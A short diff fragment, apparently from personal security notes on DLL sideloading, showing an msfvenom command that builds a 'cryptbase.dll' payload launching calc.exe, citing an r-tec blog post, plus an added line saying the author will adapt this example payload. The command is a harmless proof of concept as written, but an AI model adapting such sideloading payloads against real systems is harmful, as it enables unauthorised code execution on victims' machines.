@@ -571,3 +571,6 @@ https://www.r-tec.net/r-tec-blog-dll-sideloading.html
 msfvenom -f dll -p windows/x64/exec CMD="C:\\Windows\\System32\\calc.exe" -o cryptbase.dll`
 ```
 
+I have found this example payload that i will adapt slightly to my needs at this time!
+
+
